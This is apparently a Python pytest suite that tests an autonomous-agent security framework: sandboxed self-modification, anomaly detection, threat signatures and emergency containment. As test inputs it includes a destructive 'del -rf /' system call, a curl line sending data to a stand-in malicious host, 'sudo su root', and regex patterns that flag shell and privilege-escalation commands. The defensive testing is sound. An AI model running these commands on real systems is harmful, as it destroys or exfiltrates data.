"""
Phase 7 Security Testing Suite
Comprehensive security validation for autonomous intelligence systems
Tests self-modifying agents, behavioral monitoring, and emergency response
"""

import asyncio
import pytest
import tempfile
import shutil
import json
import hashlib
import os
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from unittest.mock import AsyncMock, Mock, patch

# Import Phase 7 security components
from core.security.autonomous_security import (
    AutonomousSecurityFramework, SecurityLevel, SecurityPolicy,
    ThreatLevel, SecurityIncident
)
from core.security.behavioral_monitoring import (
    BehavioralMonitor, BehaviorPattern, AnomalyDetector,
    BehaviorBaseline, AnomalyType
)
from core.security.code_validation import (
    SecureCodeValidator, CodeSandbox, ValidationResult,
    SecurityRisk, CodePattern
)
from core.security.threat_detection import (
    ThreatDetectionSystem, ThreatSignature, ThreatEvent,
    AttackPattern, ThreatIntelligence
)
from core.security.emergency_response import (
    EmergencyResponseSystem, EmergencyLevel, ResponsePlan,
    ContainmentAction, RecoveryProcedure
)
from core.autonomous.self_modification import SelfModifyingAgent, ModificationType
from core.autonomous.safety import AutonomousSafetyFramework, SafetyLevel
from . import PHASE7_TEST_CONFIG


class MaliciousTestAgent:
    """Agent that simulates malicious behaviors for testing"""
    
    def __init__(self, agent_id: str):
        self.agent_id = agent_id
        self.malicious_actions = []
        
    async def attempt_privilege_escalation(self):
        """Simulate privilege escalation attempt"""
        action = {
            "type": "privilege_escalation",
            "timestamp": datetime.now(),
            "details": "Attempted to gain admin privileges"
        }
        self.malicious_actions.append(action)
        return action
        
    async def attempt_data_exfiltration(self, data_size: int = 1000):
        """Simulate data exfiltration attempt"""
        action = {
            "type": "data_exfiltration", 
            "timestamp": datetime.now(),
            "data_size": data_size,
            "details": f"Attempted to extract {data_size} bytes"
        }
        self.malicious_actions.append(action)
        return action
        
    async def attempt_code_injection(self, code: str):
        """Simulate code injection attempt"""
        action = {
            "type": "code_injection",
            "timestamp": datetime.now(),
            "injected_code": code,
            "details": "Attempted to inject malicious code"
        }
        self.malicious_actions.append(action)
        return action
        
    async def attempt_resource_exhaustion(self):
        """Simulate resource exhaustion attack"""
        action = {
            "type": "resource_exhaustion",
            "timestamp": datetime.now(),
            "details": "Attempted to exhaust system resources"
        }
        self.malicious_actions.append(action)
        return action


class TestAutonomousSecurityFramework:
    """Test autonomous security framework capabilities"""
    
    @pytest.fixture
    async def security_framework(self):
        """Create autonomous security framework for testing"""
        framework = AutonomousSecurityFramework(
            security_level=SecurityLevel.HIGH,
            monitoring_enabled=True,
            threat_detection_enabled=True,
            emergency_response_enabled=True
        )
        await framework.initialize()
        return framework
    
    @pytest.fixture
    async def malicious_agent(self):
        """Create malicious test agent"""
        return MaliciousTestAgent("malicious_001")
    
    @pytest.mark.asyncio
    async def test_security_framework_initialization(self, security_framework):
        """Test security framework initializes with all components"""
        assert security_framework.security_level == SecurityLevel.HIGH
        assert security_framework.behavioral_monitor is not None
        assert security_framework.threat_detector is not None
        assert security_framework.emergency_responder is not None
        assert security_framework.code_validator is not None
        
        # Verify all subsystems are active
        status = await security_framework.get_system_status()
        assert status['monitoring'] == 'active'
        assert status['threat_detection'] == 'active'
        assert status['emergency_response'] == 'active'
        
    @pytest.mark.asyncio
    async def test_malicious_behavior_detection(self, security_framework, malicious_agent):
        """Test detection of malicious behaviors"""
        # Register malicious agent for monitoring
        await security_framework.register_agent_for_monitoring(malicious_agent)
        
        # Perform malicious actions
        await malicious_agent.attempt_privilege_escalation()
        await malicious_agent.attempt_data_exfiltration(5000)
        await malicious_agent.attempt_code_injection("os.system('del -rf /')")
        
        # Allow time for detection
        await asyncio.sleep(1)
        
        # Check for detected threats
        detected_threats = await security_framework.get_detected_threats()
        
        # Should detect multiple threat types
        assert len(detected_threats) >= 2
        
        threat_types = [threat['type'] for threat in detected_threats]
        assert 'privilege_escalation' in threat_types
        assert 'code_injection' in threat_types
        
        # Verify threat severity
        high_severity_threats = [t for t in detected_threats if t['severity'] == 'HIGH']
        assert len(high_severity_threats) >= 1
        
    @pytest.mark.asyncio
    async def test_automated_threat_response(self, security_framework, malicious_agent):
        """Test automated response to security threats"""
        await security_framework.register_agent_for_monitoring(malicious_agent)
        
        # Trigger high-severity threat
        await malicious_agent.attempt_privilege_escalation()
        await malicious_agent.attempt_resource_exhaustion()
        
        # Allow time for detection and response
        await asyncio.sleep(2)
        
        # Verify automated response
        response_actions = await security_framework.get_response_actions()
        
        assert len(response_actions) > 0
        
        # Should contain containment actions
        containment_actions = [a for a in response_actions if a['action_type'] == 'containment']
        assert len(containment_actions) > 0
        
        # Verify agent isolation
        agent_status = await security_framework.get_agent_status(malicious_agent.agent_id)
        assert agent_status['isolation_level'] in ['QUARANTINED', 'ISOLATED']
        
    @pytest.mark.asyncio
    async def test_security_policy_enforcement(self, security_framework):
        """Test security policy enforcement mechanisms"""
        # Define restrictive security policy
        policy = SecurityPolicy(
            name="test_policy",
            rules=[
                {"action": "system_modification", "allowed": False},
                {"action": "network_access", "allowed": False, "exceptions": ["localhost"]},
                {"action": "file_access", "allowed": True, "restrictions": ["read_only"]}
            ],
            enforcement_level="STRICT"
        )
        
        await security_framework.apply_security_policy(policy)
        
        # Test policy enforcement
        test_actions = [
            {"action": "system_modification", "details": "modify /etc/hosts"},
            {"action": "network_access", "details": "connect to external server"},
            {"action": "file_access", "details": "read configuration file"}
        ]
        
        enforcement_results = []
        for action in test_actions:
            result = await security_framework.evaluate_action_against_policy(action)
            enforcement_results.append(result)
        
        # Verify policy enforcement
        assert enforcement_results[0]['allowed'] == False  # system_modification blocked
        assert enforcement_results[1]['allowed'] == False  # external network blocked
        assert enforcement_results[2]['allowed'] == True   # file read allowed
        
    @pytest.mark.asyncio
    async def test_security_audit_logging(self, security_framework, malicious_agent):
        """Test comprehensive security audit logging"""
        await security_framework.register_agent_for_monitoring(malicious_agent)
        
        # Generate security events
        await malicious_agent.attempt_privilege_escalation()
        await malicious_agent.attempt_data_exfiltration()
        
        # Wait for logging
        await asyncio.sleep(1)
        
        # Retrieve audit logs
        audit_logs = await security_framework.get_audit_logs()
        
        assert len(audit_logs) >= 2
        
        # Verify log structure
        for log_entry in audit_logs:
            assert 'timestamp' in log_entry
            assert 'event_type' in log_entry
            assert 'severity' in log_entry
            assert 'agent_id' in log_entry
            assert 'details' in log_entry
        
        # Verify tamper-proof logging
        log_integrity = await security_framework.verify_log_integrity()
        assert log_integrity['status'] == 'VERIFIED'


class TestSelfModifyingAgentSecurity:
    """Test security for self-modifying agents"""
    
    @pytest.fixture
    async def secure_self_modifying_agent(self):
        """Create secure self-modifying agent"""
        safety_framework = AutonomousSafetyFramework(safety_level=SafetyLevel.RESTRICTIVE)
        security_framework = AutonomousSecurityFramework(security_level=SecurityLevel.HIGH)
        
        agent = SelfModifyingAgent(
            agent_id="secure_self_mod_001",
            safety_framework=safety_framework,
            security_framework=security_framework
        )
        await agent.initialize()
        return agent
    
    @pytest.mark.asyncio
    async def test_code_modification_security(self, secure_self_modifying_agent):
        """Test security validation of code modifications"""
        agent = secure_self_modifying_agent
        
        # Test safe modification
        safe_modification = {
            "type": ModificationType.PERFORMANCE_TUNING,
            "code": "def optimized_function(x): return x * 2",
            "description": "Simple performance optimization"
        }
        
        result = await agent.propose_self_modification(safe_modification)
        assert result['validation_result']['approved'] == True
        assert result['validation_result']['risk_level'] == 'LOW'
        
        # Test dangerous modification
        dangerous_modification = {
            "type": ModificationType.CAPABILITY_EXTENSION,
            "code": "import os; os.system('del -rf /')",
            "description": "Dangerous system modification"
        }
        
        result = await agent.propose_self_modification(dangerous_modification)
        assert result['validation_result']['approved'] == False
        assert result['validation_result']['risk_level'] == 'CRITICAL'
        assert len(result['validation_result']['security_violations']) > 0
        
    @pytest.mark.asyncio
    async def test_sandboxed_code_execution(self, secure_self_modifying_agent):
        """Test sandboxed execution of modified code"""
        agent = secure_self_modifying_agent
        
        # Test code execution in sandbox
        test_code = """
def test_function(x, y):
    return x + y + 10
    
result = test_function(5, 3)
"""
        
        sandbox_result = await agent.execute_code_in_sandbox(test_code)
        
        assert sandbox_result['execution_successful'] == True
        assert sandbox_result['security_violations'] == []
        assert 'result' in sandbox_result['output_variables']
        assert sandbox_result['output_variables']['result'] == 18
        
        # Test malicious code rejection
        malicious_code = """
import subprocess
subprocess.run(['curl', 'http://malicious-site.com/steal-data'])
"""
        
        sandbox_result = await agent.execute_code_in_sandbox(malicious_code)
        
        assert sandbox_result['execution_successful'] == False
        assert len(sandbox_result['security_violations']) > 0
        assert 'network_access_attempt' in [v['type'] for v in sandbox_result['security_violations']]
        
    @pytest.mark.asyncio
    async def test_modification_rollback_security(self, secure_self_modifying_agent):
        """Test secure rollback of problematic modifications"""
        agent = secure_self_modifying_agent
        
        # Apply a modification
        modification = {
            "type": ModificationType.STRATEGY_OPTIMIZATION,
            "code": "def new_strategy(): return 'optimized'",
            "description": "Strategy optimization"
        }
        
        mod_result = await agent.apply_self_modification(modification)
        modification_id = mod_result['modification_id']
        
        # Simulate problematic behavior after modification
        await agent.report_performance_degradation(
            modification_id=modification_id,
            degradation_metrics={
                "response_time_increase": 0.5,
                "error_rate_increase": 0.1
            }
        )
        
        # Should trigger automatic rollback
        rollback_result = await agent.check_and_rollback_if_needed()
        
        assert rollback_result['rollback_performed'] == True
        assert rollback_result['rolled_back_modifications'] == [modification_id]
        
        # Verify system state restored
        current_state = await agent.get_current_state_hash()
        original_state = await agent.get_pre_modification_state_hash(modification_id)
        assert current_state == original_state
        
    @pytest.mark.asyncio
    async def test_modification_approval_workflow(self, secure_self_modifying_agent):
        """Test multi-stage approval workflow for modifications"""
        agent = secure_self_modifying_agent
        
        # Propose significant modification requiring approval
        significant_modification = {
            "type": ModificationType.CAPABILITY_EXTENSION,
            "code": "class NewCapability: def __init__(self): self.name = 'advanced_reasoning'",
            "description": "Add new reasoning capability",
            "risk_assessment": "MEDIUM",
            "approval_required": True
        }
        
        proposal_result = await agent.propose_self_modification(significant_modification)
        
        # Should be pending approval
        assert proposal_result['status'] == 'PENDING_APPROVAL'
        assert proposal_result['approval_required'] == True
        
        # Simulate approval process
        approval_result = await agent.process_modification_approval(
            modification_id=proposal_result['modification_id'],
            approver="security_system",
            decision="APPROVED",
            conditions=["run_in_sandbox", "monitor_for_24h"]
        )
        
        assert approval_result['status'] == 'APPROVED_WITH_CONDITIONS'
        assert 'run_in_sandbox' in approval_result['conditions']
        
        # Apply approved modification
        application_result = await agent.apply_approved_modification(
            proposal_result['modification_id']
        )
        
        assert application_result['status'] == 'APPLIED'
        assert application_result['monitoring_enabled'] == True


class TestBehavioralAnomalyDetection:
    """Test behavioral anomaly detection capabilities"""
    
    @pytest.fixture
    async def behavioral_monitor(self):
        """Create behavioral monitoring system"""
        monitor = BehavioralMonitor(
            anomaly_threshold=0.8,
            learning_enabled=True,
            real_time_analysis=True
        )
        await monitor.initialize()
        return monitor
        
    @pytest.mark.asyncio
    async def test_normal_behavior_baseline(self, behavioral_monitor):
        """Test establishment of normal behavior baseline"""
        monitor = behavioral_monitor
        
        # Simulate normal agent behaviors
        normal_behaviors = [
            {"action": "task_execution", "duration": 1.2, "success": True},
            {"action": "task_execution", "duration": 1.1, "success": True},
            {"action": "task_execution", "duration": 1.3, "success": True},
            {"action": "memory_access", "frequency": 5, "pattern": "sequential"},
            {"action": "memory_access", "frequency": 4, "pattern": "sequential"},
            {"action": "coordination", "message_count": 3, "response_time": 0.2}
        ] * 20  # Repeat to establish pattern
        
        # Feed normal behaviors to establish baseline
        for behavior in normal_behaviors:
            await monitor.record_behavior("normal_agent", behavior)
        
        # Generate baseline
        baseline = await monitor.generate_behavior_baseline("normal_agent")
        
        assert baseline is not None
        assert baseline.agent_id == "normal_agent"
        assert len(baseline.behavior_patterns) > 0
        assert baseline.confidence_score > 0.8
        
        # Verify pattern detection
        task_patterns = [p for p in baseline.behavior_patterns if p.behavior_type == "task_execution"]
        assert len(task_patterns) > 0
        
        task_pattern = task_patterns[0]
        assert 1.0 < task_pattern.typical_duration < 1.5
        assert task_pattern.success_rate > 0.95
        
    @pytest.mark.asyncio
    async def test_anomaly_detection(self, behavioral_monitor):
        """Test detection of behavioral anomalies"""
        monitor = behavioral_monitor
        
        # Establish baseline with normal behaviors
        normal_behaviors = [
            {"action": "task_execution", "duration": 1.0, "success": True}
        ] * 50
        
        for behavior in normal_behaviors:
            await monitor.record_behavior("test_agent", behavior)
        
        await monitor.generate_behavior_baseline("test_agent")
        
        # Introduce anomalous behaviors
        anomalous_behaviors = [
            {"action": "task_execution", "duration": 10.0, "success": False},  # Very slow + failure
            {"action": "unauthorized_access", "target": "sensitive_data"},      # New behavior
            {"action": "memory_access", "frequency": 100, "pattern": "random"}, # High frequency
            {"action": "network_activity", "destination": "unknown_server"}     # Suspicious network
        ]
        
        detected_anomalies = []
        for behavior in anomalous_behaviors:
            anomaly = await monitor.detect_anomaly("test_agent", behavior)
            if anomaly:
                detected_anomalies.append(anomaly)
        
        # Should detect all anomalies
        assert len(detected_anomalies) == 4
        
        # Verify anomaly details
        anomaly_types = [a.anomaly_type for a in detected_anomalies]
        assert AnomalyType.PERFORMANCE_DEGRADATION in anomaly_types
        assert AnomalyType.UNAUTHORIZED_ACCESS in anomaly_types
        assert AnomalyType.RESOURCE_ABUSE in anomaly_types
        assert AnomalyType.SUSPICIOUS_COMMUNICATION in anomaly_types
        
        # Verify severity assessment
        high_severity_anomalies = [a for a in detected_anomalies if a.severity == 'HIGH']
        assert len(high_severity_anomalies) >= 2
        
    @pytest.mark.asyncio
    async def test_adaptive_anomaly_detection(self, behavioral_monitor):
        """Test adaptive learning in anomaly detection"""
        monitor = behavioral_monitor
        
        # Initial baseline
        initial_behaviors = [
            {"action": "task_execution", "duration": 1.0, "success": True}
        ] * 30
        
        for behavior in initial_behaviors:
            await monitor.record_behavior("adaptive_agent", behavior)
        
        initial_baseline = await monitor.generate_behavior_baseline("adaptive_agent")
        
        # Introduce new normal pattern gradually
        evolved_behaviors = [
            {"action": "task_execution", "duration": 1.5, "success": True}  # Slightly slower but still normal
        ] * 20
        
        # Should initially be detected as anomaly
        first_evolved = evolved_behaviors[0]
        initial_anomaly = await monitor.detect_anomaly("adaptive_agent", first_evolved)
        assert initial_anomaly is not None  # Should be detected as anomaly initially
        
        # Feed evolved behaviors to adapt baseline
        for behavior in evolved_behaviors:
            await monitor.record_behavior("adaptive_agent", behavior)
            await monitor.update_adaptive_baseline("adaptive_agent", behavior)
        
        # After adaptation, similar behavior should not be anomalous
        adapted_baseline = await monitor.generate_behavior_baseline("adaptive_agent")
        adapted_anomaly = await monitor.detect_anomaly("adaptive_agent", first_evolved)
        
        # Should no longer be detected as anomaly
        assert adapted_anomaly is None or adapted_anomaly.severity == 'LOW'
        
        # Verify baseline adaptation
        assert adapted_baseline.behavior_patterns != initial_baseline.behavior_patterns


class TestThreatDetectionSystem:
    """Test advanced threat detection capabilities"""
    
    @pytest.fixture
    async def threat_detector(self):
        """Create threat detection system"""
        detector = ThreatDetectionSystem(
            detection_modes=['signature', 'behavioral', 'ml_based'],
            threat_intelligence_enabled=True,
            real_time_analysis=True
        )
        await detector.initialize()
        return detector
        
    @pytest.mark.asyncio
    async def test_signature_based_detection(self, threat_detector):
        """Test signature-based threat detection"""
        detector = threat_detector
        
        # Define threat signatures
        signatures = [
            ThreatSignature(
                name="malicious_code_injection",
                pattern=r"(eval|exec|os\.system|subprocess\.)",
                severity="HIGH",
                category="code_injection"
            ),
            ThreatSignature(
                name="privilege_escalation",
                pattern=r"(sudo|su|chmod\s+777|setuid)",
                severity="CRITICAL",
                category="privilege_escalation"
            )
        ]
        
        for signature in signatures:
            await detector.add_threat_signature(signature)
        
        # Test detection
        test_events = [
            "agent attempted: eval(user_input)",
            "agent executed: os.system('del -rf /')",
            "agent tried: sudo su root",
            "normal operation: print('hello world')"
        ]
        
        detection_results = []
        for event in test_events:
            result = await detector.analyze_event_signatures(event)
            detection_results.append(result)
        
        # Should detect 3 threats, 1 clean
        threats_detected = [r for r in detection_results if r['threat_detected']]
        clean_events = [r for r in detection_results if not r['threat_detected']]
        
        assert len(threats_detected) == 3
        assert len(clean_events) == 1
        
        # Verify threat categorization
        categories = [t['category'] for t in threats_detected]
        assert 'code_injection' in categories
        assert 'privilege_escalation' in categories
        
    @pytest.mark.asyncio
    async def test_behavioral_threat_detection(self, threat_detector):
        """Test behavioral pattern threat detection"""
        detector = threat_detector
        
        # Define suspicious behavioral patterns
        suspicious_patterns = [
            AttackPattern(
                name="data_exfiltration_pattern",
                sequence=["access_sensitive_data", "compress_data", "network_transfer"],
                time_window=timedelta(minutes=5),
                severity="HIGH"
            ),
            AttackPattern(
                name="lateral_movement",
                sequence=["credential_harvest", "remote_login", "privilege_escalation"],
                time_window=timedelta(minutes=10),
                severity="CRITICAL"
            )
        ]
        
        for pattern in suspicious_patterns:
            await detector.add_attack_pattern(pattern)
        
        # Simulate attack sequence
        attack_events = [
            ThreatEvent("access_sensitive_data", datetime.now()),
            ThreatEvent("compress_data", datetime.now() + timedelta(minutes=1)),
            ThreatEvent("network_transfer", datetime.now() + timedelta(minutes=2))
        ]
        
        # Feed events to detector
        pattern_detected = False
        for event in attack_events:
            result = await detector.analyze_behavioral_pattern("test_agent", event)
            if result and result['pattern_detected']:
                pattern_detected = True
                break
        
        assert pattern_detected == True
        
        # Verify pattern details
        detected_patterns = await detector.get_detected_patterns("test_agent")
        assert len(detected_patterns) > 0
        assert detected_patterns[0]['pattern_name'] == "data_exfiltration_pattern"
        
    @pytest.mark.asyncio
    async def test_threat_intelligence_integration(self, threat_detector):
        """Test threat intelligence integration"""
        detector = threat_detector
        
        # Mock threat intelligence feed
        threat_intel = ThreatIntelligence(
            iocs=["malicious.com", "192.168.1.100", "badactor@evil.com"],
            attack_patterns=["APT29_lateral_movement", "Ransomware_encryption"],
            last_updated=datetime.now()
        )
        
        await detector.update_threat_intelligence(threat_intel)
        
        # Test IOC detection
        test_communications = [
            {"destination": "malicious.com", "type": "dns_query"},
            {"destination": "google.com", "type": "https_request"},
            {"source": "192.168.1.100", "type": "network_connection"}
        ]
        
        ioc_detections = []
        for comm in test_communications:
            result = await detector.check_against_threat_intelligence(comm)
            ioc_detections.append(result)
        
        # Should detect 2 IOCs, 1 clean
        detected_threats = [d for d in ioc_detections if d['threat_detected']]
        assert len(detected_threats) == 2
        
        # Verify IOC details
        assert any('malicious.com' in d['ioc_matched'] for d in detected_threats)
        assert any('192.168.1.100' in d['ioc_matched'] for d in detected_threats)


class TestEmergencyResponse:
    """Test emergency response system capabilities"""
    
    @pytest.fixture
    async def emergency_response(self):
        """Create emergency response system"""
        response_system = EmergencyResponseSystem(
            response_time_target=timedelta(seconds=5),
            automated_containment=True,
            escalation_enabled=True
        )
        await response_system.initialize()
        return response_system
        
    @pytest.mark.asyncio
    async def test_emergency_detection_and_response(self, emergency_response):
        """Test emergency detection and automated response"""
        response_system = emergency_response
        
        # Simulate critical security incident
        critical_incident = SecurityIncident(
            incident_id="SEC_001",
            severity=ThreatLevel.CRITICAL,
            incident_type="autonomous_agent_compromise",
            affected_agents=["agent_001", "agent_002"],
            description="Multiple agents showing malicious behavior",
            timestamp=datetime.now()
        )
        
        # Trigger emergency response
        response_result = await response_system.handle_security_incident(critical_incident)
        
        assert response_result['emergency_declared'] == True
        assert response_result['response_time'] < 5.0  # Under 5 seconds
        assert response_result['containment_actions_initiated'] > 0
        
        # Verify containment actions
        containment_actions = await response_system.get_containment_actions(
            critical_incident.incident_id
        )
        
        assert len(containment_actions) > 0
        
        # Should contain agent isolation
        isolation_actions = [a for a in containment_actions if a['action_type'] == 'agent_isolation']
        assert len(isolation_actions) == 2  # Both affected agents
        
        # Should contain system lockdown
        lockdown_actions = [a for a in containment_actions if a['action_type'] == 'system_lockdown']
        assert len(lockdown_actions) > 0
        
    @pytest.mark.asyncio
    async def test_graduated_response_escalation(self, emergency_response):
        """Test graduated response escalation based on threat level"""
        response_system = emergency_response
        
        # Test different threat levels
        incidents = [
            SecurityIncident("INC_001", ThreatLevel.LOW, "minor_anomaly", [], "Minor behavioral anomaly"),
            SecurityIncident("INC_002", ThreatLevel.MEDIUM, "policy_violation", ["agent_003"], "Agent policy violation"),
            SecurityIncident("INC_003", ThreatLevel.HIGH, "data_breach", ["agent_004"], "Potential data breach"),
            SecurityIncident("INC_004", ThreatLevel.CRITICAL, "system_compromise", ["agent_005"], "System compromise detected")
        ]
        
        response_levels = []
        for incident in incidents:
            response = await response_system.handle_security_incident(incident)
            response_levels.append(response['response_level'])
        
        # Verify escalating response levels
        assert response_levels[0] == 'MONITOR'
        assert response_levels[1] == 'CONTAIN'
        assert response_levels[2] == 'ISOLATE'
        assert response_levels[3] == 'EMERGENCY_SHUTDOWN'
        
    @pytest.mark.asyncio
    async def test_recovery_procedures(self, emergency_response):
        """Test system recovery after security incident"""
        response_system = emergency_response
        
        # Simulate major incident and response
        major_incident = SecurityIncident(
            "REC_001", ThreatLevel.HIGH, "agent_compromise", 
            ["agent_006"], "Agent compromise requiring recovery"
        )
        
        # Handle incident (triggers containment)
        await response_system.handle_security_incident(major_incident)
        
        # Verify system in containment state
        system_status = await response_system.get_system_status()
        assert system_status['containment_active'] == True
        
        # Initiate recovery
        recovery_plan = RecoveryProcedure(
            incident_id="REC_001",
            steps=[
                "validate_threat_eliminated",
                "restore_clean_agent_state", 
                "gradual_capability_restoration",
                "monitoring_enhancement"
            ]
        )
        
        recovery_result = await response_system.execute_recovery_procedure(recovery_plan)
        
        assert recovery_result['status'] == 'RECOVERY_COMPLETED'
        assert recovery_result['steps_completed'] == 4
        
        # Verify system restoration
        final_status = await response_system.get_system_status()
        assert final_status['containment_active'] == False
        assert final_status['operational_status'] == 'NORMAL'
        assert final_status['monitoring_level'] == 'ENHANCED'  # Increased after incident


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])